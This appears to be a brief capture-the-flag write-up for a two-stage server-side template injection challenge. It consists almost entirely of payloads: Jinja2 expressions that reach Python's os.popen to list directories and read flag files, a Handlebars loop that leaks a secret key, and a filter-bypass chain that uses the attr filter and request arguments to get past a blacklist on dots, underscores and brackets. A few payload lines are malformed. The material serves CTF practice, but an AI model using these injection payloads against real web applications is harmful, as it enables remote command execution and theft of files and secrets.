https://double-ssti.chal.h4ck3r.quest/
Skills: SSTI


Hints
Just Google and RTFM.



{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}
{{request.application.__globals__.__builtins__.[0]('os').popen('ls').read()}}
{{request.application.__globals__.__builtins__.[0]('os').popen('ls').read()}}



{{ ().__class__.__base__.__subclasses__ }}

1. 1nd ssti

{{#each this}}
   {{this}}
{{/each}}

secret key:
77777me0w_me0w_s3cr3t77777


2. 2nd ssit
/2nd_stage_77777me0w_me0w_s3cr3t77777



black_list:
. , _,[]

target:{{request.application.__globals__.__builtins__.__import__('os').popen('cd /;ls;cat th1s_15_fl4ggggggg').read()}}

url:https://double-ssti.chal.h4ck3r.quest/2nd_stage_77777me0w_me0w_s3cr3t77777?a=__class__&&b=__base__&&c=__subclasses__&&d=__init__&&e=__globals__


input:{{()|attr(request|attr("args")|attr("get")('a'))|attr(request|attr("args")|attr("get")('b'))|attr(request|attr("args")|attr("get")('c'))()|attr("pop")(132)|attr(request|attr("args")|attr("get")('d'))|attr(request|attr("args")|attr("get")('e'))|attr('get')('popen')('cat /y000_i_am_za_fl4g')|attr('read')()}}


